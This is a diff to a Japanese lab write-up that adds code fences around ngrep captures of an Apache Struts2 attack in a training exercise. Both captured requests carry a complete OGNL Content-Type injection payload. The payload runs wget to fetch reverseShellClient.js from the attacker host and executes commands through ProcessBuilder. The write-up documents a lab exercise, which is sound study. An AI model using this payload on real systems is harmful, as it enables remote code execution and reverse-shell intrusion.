@@ -125,12 +125,17 @@ vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .
 ```
 
 + Attacker OSからproxyサーバへのHTTPリクエスト。シェルコマンドが送信されているのがわかる。   <br>
+
+``
   T 192.168.33.20:57860 -> 192.168.1.100:80 [AP]
   GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
   User-Agent: Mozilla/5.0.
   Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#**cmd=wget ht&#8203;tp//192.168.33.20:8081/reverseShellClient.js**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+``
 
 + proxyサーバからApache Struts2に転送  <br>
+
+``
   T 192.168.1.100:37888 -> 192.168.1.10:8080 [AP]
   GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
   X-Forwarded-Host: target.cyexc-target.
@@ -140,6 +145,7 @@ vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .
   X-Real-IP: 192.168.33.20.
   Host: target.cyexc-target.
   Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#**cmd=wget ht&#8203;tp://192.168.33.20:8081/reverseShellClient.js**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+``
 
 取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex1/logs/ngrep.log)
 
